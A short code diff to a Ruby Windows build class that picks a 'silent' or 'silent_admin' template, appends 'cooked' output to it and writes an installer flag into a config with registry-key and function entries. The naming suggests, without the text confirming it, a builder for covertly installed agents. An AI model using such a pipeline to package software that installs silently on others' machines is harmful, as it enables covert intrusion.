@@ -190,9 +190,12 @@ class BuildWindows < Build
       File.exist? path('output') || raise("output file not created")
 
       cooked = File.open(path('output'), 'rb') {|f| f.read}
-      File.open(path('silent'), 'ab+') {|f| f.write cooked}
+
+      silent_file = params['admin'] == true ? 'silent_admin' : 'silent'
+      File.open(path(silent_file), 'ab+') {|f| f.write cooked}
+
       FileUtils.rm_rf path('output')
-      FileUtils.cp path('silent'), path('output')
+      FileUtils.cp path(silent_file), path('output')
     end
 
     # this is a build for the NI
@@ -293,6 +296,7 @@ class BuildWindows < Build
       f.puts "HKEY=#{key}"
       f.puts "MANIFEST=" + (params['admin'] == true ? 'yes' : 'no')
       f.puts "FUNC=" + @funcname
+      f.puts "INSTALLER=" + (@cooked ? 'no' : 'yes')
     end
 
     cook_param = '-C -R ' + path('') + ' -O ' + path('output')
